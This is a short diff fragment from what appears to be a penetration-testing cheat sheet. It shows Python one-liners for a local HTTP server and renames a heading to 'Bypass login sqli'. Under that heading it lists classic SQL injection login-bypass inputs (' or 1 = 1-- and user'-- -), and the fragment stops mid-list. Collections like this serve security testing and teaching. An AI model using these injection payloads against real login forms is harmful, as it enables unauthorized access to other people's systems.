@@ -7,7 +7,7 @@ python -m SimpleHTTPServer
 python3 -m http.server
 ```
 
-### Bypass login
+### Bypass login sqli
 ```
 ' or 1 = 1--
 user'-- -
